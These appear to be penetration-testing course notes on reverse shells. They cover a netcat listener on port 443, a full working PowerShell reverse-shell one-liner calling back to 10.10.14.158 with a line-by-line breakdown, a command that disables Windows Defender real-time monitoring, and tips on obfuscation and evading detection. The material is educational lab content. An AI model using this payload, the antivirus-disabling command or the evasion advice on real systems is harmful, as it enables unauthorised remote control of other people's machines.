## Reverse Shell

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

![reverse shell](/Assets/attachments/reverseshell.png)
[Reverse shell cheat shee](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### **Why Reverse Shells are Effective**

- Admins often overlook outbound connections, increasing the chances of avoiding detection.
- Unlike bind shells, which rely on incoming connections (requiring open firewall ports), reverse shells initiate connections from the target to the attacker's machine.
- This makes reverse shells more practical in real-world scenarios where strict firewall rules are common.

#### **How Reverse Shells Work**

- **Attack Box**: Starts a listener to wait for an incoming connection.
- **Target System**: Initiates the connection to the attack box using a method such as:
  - Unrestricted File Upload
  - Command Injection
- **Roles Reversed**: The attack box becomes the server, and the target system acts as the client.

#### **Using Pre-Made Resources**

- **Reverse Shell Cheat Sheet**: A valuable resource with:
  - Commands and code for various reverse shell scenarios.
  - Automated reverse shell generators for practice or engagements.
- **Be Cautious**:
  - Admins may monitor and adapt to publicly known tools and repositories.
  - Customization of payloads and attacks may be necessary to evade detection.

#### **Practical Example: Reverse Shell on Windows**

1. **Set Up a Listener**: Start a Netcat listener on the attack box.
2. **Spawn the Reverse Shell**: Use PowerShell code or another method to force the target to connect to the listener.

```
sudo nc -lvnp 443
```

### Using Netcat for Reverse Shells and Port Considerations

#### **Listener Setup**

- **Command**: `sudo nc -lvnp 443`
- **Port Selection**: Port 443 is commonly used for HTTPS traffic.
  - Choosing a common port like 443 increases the likelihood of bypassing OS and network firewalls.
  - Outbound traffic on port 443 is rarely blocked since many applications rely on HTTPS.

#### **Firewall Considerations**

- **Standard Firewalls**: Allow traffic based on ports and IP addresses, making port 443 effective for bypassing basic rules.
- **Advanced Firewalls**: Utilize deep packet inspection (DPI) and Layer 7 analysis to detect suspicious traffic, even on allowed ports.
- **Evasion Techniques**: Briefly covered in this module; detailed techniques will be addressed later.

#### **Netcat on Windows**

- **Challenges**:
  - Netcat is not a native tool on Windows systems.
  - Reliance on Netcat requires transferring the binary to the target, which may not always be feasible.
- **Best Practice**:
  - Use tools and utilities already present on the target system ("living off the land") for better reliability and stealth.

#### **Next Steps**

- Spawn the reverse shell on the target.
- Use tools like RDP for further interactions.
- Experiment with transferring tools like Netcat to the target when native utilities are

### What applications and shell languages are hosted on the target?

This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.

On the Windows target, open a command prompt and copy & paste this command:

##### Client Target

```shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Reverse Shell Payload

#### **Overview**

This PowerShell one-liner establishes a reverse shell connection from the target to an attacker's machine. The payload uses PowerShell's capabilities to create a TCP client that communicates with the attacker's listener.

---

#### **Command Breakdown**

```shell
powershell -nop -c "..."
```

- **`-nop`**: Runs PowerShell without the startup profile, reducing potential interference.
- **`-c`**: Executes the command provided as a string.

---

#### **Core Logic**

```shell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

- Creates a TCP client to connect to the attacker's machine (`10.10.14.158`) on port `443`.

```shell
$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};
```

- Opens a data stream for communication.
- Allocates a buffer array for reading incoming data.

```shell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
```

- **While Loop**: Listens for commands from the attacker's machine.
  - **`iex $data`**: Executes received commands (potentially dangerous; executes untrusted input).
  - **Output Handling**: Captures the output of the executed commands, appends the current directory, and sends the response back to the attacker.
- **Data Transfer**:
  - Converts the output into ASCII-encoded bytes.
  - Sends the data back through the TCP stream.

```
$client.Close();
```

- Closes the TCP connection once the session ends.

---

#### **Use Case**

- Establishes a reverse shell session, allowing remote command execution on the target system.
- Used in penetration testing to control a compromised system.

---

#### **Caveats & Detection**

- **Firewalls**: Port 443 is typically allowed for outbound connections, bypassing many firewall rules.
- **Security Tools**:
  - Modern endpoint detection and response (EDR) systems may flag PowerShell usage for reverse shells.
  - Command obfuscation techniques can help evade detection.
- **Execution Policy**: The payload assumes PowerShell is permitted to run unrestricted scripts.

---

#### **Listener Setup**

- Start a listener on the attacker's machine (e.g., `sudo nc -lvnp 443`) before executing the payload to receive the shell connection.

---

#### **Improvement Opportunities**

- Consider obfuscating the command to reduce detection.
- Test in controlled environments before using in real scenarios.

### What happened when we hit enter in command prompt?

The `Windows Defender antivirus (AV)` software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if `AV` is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection` settings or by using this command in an administrative PowerShell console (right-click, run as admin):

### Disable AV

```shell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once the AV is disabled we can run the command.

```
sudo nc -lvnp 443
```

### Calling PowerShell

```shell
powershell -nop -c
```

Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.

## Binding A Socket
```bash
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.